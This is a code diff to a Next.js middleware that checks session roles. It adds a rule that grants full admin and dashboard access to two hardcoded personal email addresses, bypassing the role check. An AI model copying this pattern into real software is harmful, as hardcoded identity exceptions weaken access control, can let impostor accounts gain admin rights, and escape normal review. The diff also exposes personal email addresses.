@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server";
 import type { NextRequest } from "next/server";
 import { getToken } from "next-auth/jwt";
+import { normalizeEmail } from "@/lib/admin-access";
 
 const PUBLIC_PREFIXES = ["/", "/login", "/register", "/api/auth", "/terms", "/privacy", "/_next", "/images"];
 
@@ -52,19 +53,23 @@ export async function proxy(request: NextRequest): Promise<NextResponse> {
     return NextResponse.redirect(new URL("/login", request.url), 307);
   }
   let sessionRole: string | undefined;
+  let sessionEmail = "";
   try {
     const token = await getToken({ req: request, secret: process.env.NEXTAUTH_SECRET });
     const role = typeof token?.role === "string" ? token.role : "";
-    const session = { user: { role: role || undefined } };
-    sessionRole = session?.user?.role;
+    sessionRole = role || undefined;
+    sessionEmail = typeof token?.email === "string" ? normalizeEmail(token.email) : "";
     console.log("Current User Role:", sessionRole);
   } catch (error) {
     console.error("Proxy session fetch failed:", error);
     return NextResponse.redirect(new URL("/login?error=session", request.url), 307);
   }
 
+  const isPrivilegedAdminEmail =
+    sessionEmail === "abatiemmanuel24@gmail.com" || sessionEmail === "growthprofesors@gmail.com";
+
   // God Mode: admins can access /dashboard and /admin freely.
-  if (sessionRole === "ADMIN") {
+  if (sessionRole === "ADMIN" || isPrivilegedAdminEmail) {
     return NextResponse.next();
   }
 
